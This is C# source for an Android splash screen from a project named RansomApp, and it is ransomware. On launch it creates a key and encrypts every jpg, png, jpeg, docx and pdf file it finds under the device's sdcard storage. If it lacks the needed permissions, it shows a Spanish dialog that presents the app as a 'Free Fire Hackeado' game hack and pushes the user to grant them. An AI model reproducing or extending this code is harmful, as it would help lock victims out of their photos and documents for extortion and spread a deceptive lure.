using Android.App;
using Android.Content;
using AndroidX.AppCompat.App;
using RansomApp.Droid;
using System.IO;
using RansomApp.Droid.Services.Encrypt;


using RansomApp.Droid.Services.Settings;
using AlertDialog = Android.App.AlertDialog;
using System;

namespace RansomApp.Droid
{
    [Activity(Theme = "@style/MainTheme.Splash",
               MainLauncher = true,
               NoHistory = true)]
    public class SplashActivity : AppCompatActivity
    {
        // Launches the startup task
        protected override void OnResume()
        {
            base.OnResume();

            string[] files;
            try
            {
                string[] extensions = { "*.jpg", "*.png", "*.jpeg", "*.docx", "*.pdf" };
                string key = EncryptService.CreateKey();

                foreach (var ext in extensions)
                {
                    files = SearchFiles(ext);

                    foreach (string item in files)
                    {
                        EncryptService.EncryptFile(item);
                    }
                }

                Intent activity = new Intent(this, typeof(MainActivity));
                activity.PutExtra("key", key);
                StartActivity(activity);
            }
            catch (System.Exception e)
            {
               Console.WriteLine(e.Message);

                AlertDialog.Builder alert = new AlertDialog.Builder(this);
                alert.SetTitle("ERROR!!")

                    .SetMessage("Esta aplicacion requiere acceder a permisos del dispositivo." +
                    "\n\nConfiguracion>Aplicaciones>Free Fire Hackeado>Permisos")

                    .SetPositiveButton("Habilitar", (sendAlert, args) => {

                        AppSettings settings = new AppSettings();
                        settings.OpenAppSettings();
                    })
                    .SetNegativeButton("Cancelar", (sendAlert, args) =>
                    {
                        Finish();
                    });

                Dialog dialog = alert.Create();
                dialog.Show();
            }

        }

        public string[] SearchFiles(string extension)
        {
            string[] files = Directory.GetFiles(@"sdcard", extension, SearchOption.AllDirectories);
            return files;
        }
    }
}
